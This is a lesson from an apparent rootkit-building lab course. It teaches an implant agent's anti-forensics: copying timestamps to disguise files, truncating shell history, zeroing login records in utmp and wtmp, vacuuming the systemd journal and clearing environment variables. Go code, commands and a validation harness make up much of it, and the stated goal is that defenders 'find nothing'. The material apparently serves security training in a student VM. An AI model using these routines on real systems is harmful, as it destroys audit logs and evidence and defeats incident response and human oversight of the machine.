# L24: Anti-Forensics

L23 made your process invisible to ps and resistant to core dumps.
But the agent still leaves traces everywhere: file timestamps betray when you
touched them, login records show your session, shell history logs your commands,
and the systemd journal records everything.
An analyst running stat, last, history, or journalctl finds you in seconds.

## Five forensic traces, five scrubs

```text
  Trace                  Tool that finds it    Scrub technique
  -------------------------------------------------------------------
  File mtime/atime       stat, find -newer     os.Chtimes (timestomp)
  Environment vars       /proc/pid/environ     os.Clearenv
  Shell history          history, cat ~/.hist   Truncate history files
  Login records          last, who, w          Rewrite utmp/wtmp binary
  Journal entries        journalctl            Vacuum + rotate journal
```

## Timestomping

`stat` shows three timestamps: atime (last read), mtime (last write),
ctime (last metadata change).
An attacker who drops a file at 3 AM on a server with no nighttime activity
stands out.
`os.Chtimes` sets atime and mtime to any value you choose.
The standard technique: copy the timestamp of a nearby legitimate file, so your
file blends into the directory listing sorted by time.

```text
  before:
    -rw-r--r-- 1 root root 0 Oct 17 03:14 agent.bin   <-- stands out
    -rw-r--r-- 1 root root 0 Jan 15 09:22 resolv.conf

  after timestomp (copy resolv.conf's mtime):
    -rw-r--r-- 1 root root 0 Jan 15 09:22 agent.bin   <-- blends in
    -rw-r--r-- 1 root root 0 Jan 15 09:22 resolv.conf
```

Note: ctime cannot be set from userspace.
It updates automatically on any inode change.
Forensic tools that check ctime != mtime can detect timestomping.
This is a known limitation.

## utmp/wtmp scrubbing

`last` and `who` read binary records from `/var/run/utmp` (current logins) and
`/var/log/wtmp` (login history).
Each record is a fixed-size `utmp` struct (384 bytes on Linux).
To scrub: read the file, walk records, zero out entries matching your username
or terminal, write back.

The record layout (from utmpx.h):

```text
  offset  size  field
  0       2     ut_type (7 = USER_PROCESS)
  4       4     ut_pid
  8       32    ut_line ("pts/0")
  40      4     ut_id
  44      256   ut_user ("student")
  300     4     ut_addr_v6[0]
  ...
  384     next record
```

Walk the file in 384-byte chunks.
If ut_user matches your username, zero the entire record.
Write the modified buffer back.

## Journal tampering

systemd-journal records everything: logins, sudo, SSH, service starts.
`journalctl --since "1 hour ago"` shows your activity.
Two approaches:
1. `journalctl --vacuum-time=1s` (requires root, deletes archived journals)
2. Rotate the active journal with `systemctl kill --signal=SIGUSR2 systemd-journald`

With the rootkit loaded, escalate first, then vacuum.

## You write

`main.go` (~120 lines):

- `timestomp(target, reference string)`: copy mtime from reference to target
- `clearHistory()`: truncate common history files
- `scrubUtmp(username string)`: remove login records from utmp and wtmp
- `tamperJournal()`: vacuum and rotate journal
- `cleanup()`: orchestrate all scrubs, clear environment

The agent connects over mTLS, receives a CLEANUP command, and runs all
anti-forensics routines.

## API

```go
// Timestomping
info, _ := os.Stat(referenceFile)
os.Chtimes(targetFile, info.ModTime(), info.ModTime())

// History
os.Truncate(path, 0)

// utmp/wtmp binary record walking
f, _ := os.OpenFile("/var/run/utmp", os.O_RDWR, 0)
buf := make([]byte, 384)
for {
    _, err := io.ReadFull(f, buf)
    user := string(bytes.TrimRight(buf[44:300], "\x00"))
    if user == username {
        clear(buf)
        f.Seek(-384, io.SeekCurrent)
        f.Write(buf)
    }
}

// Journal
exec.Command("journalctl", "--vacuum-time=1s").Run()
exec.Command("systemctl", "kill", "--signal=SIGUSR2", "systemd-journald").Run()

// Environment
os.Clearenv()
```

## Test it

```
$ rklings run l24
student@vm:~$ # Create a test file and check its timestamp
student@vm:~$ touch /tmp/testfile
student@vm:~$ stat /tmp/testfile | grep Modify
Modify: 2026-10-17 03:14:00.000000000 +0000

student@vm:~$ # After agent runs CLEANUP:
student@vm:~$ stat /tmp/testfile | grep Modify
Modify: 2026-01-15 09:22:00.000000000 +0000

student@vm:~$ last | grep student
(no output)

student@vm:~$ cat ~/.bash_history
(empty)

student@vm:~$ journalctl --since "1 hour ago" 2>&1 | head -1
-- No entries --
```

## Validate

```
$ rklings validate l24
  [+] agent connects over mTLS
  [+] file timestamp matches reference
  [+] no login record for student in utmp
  [+] no login record for student in wtmp
  [+] shell history empty
  [+] environment cleared
  [+] journal vacuumed
  PASS
```

## Next

M03 integrates all tradecraft (L20 through L24) into a single ghost agent.
Run every defender tool.
Find nothing.
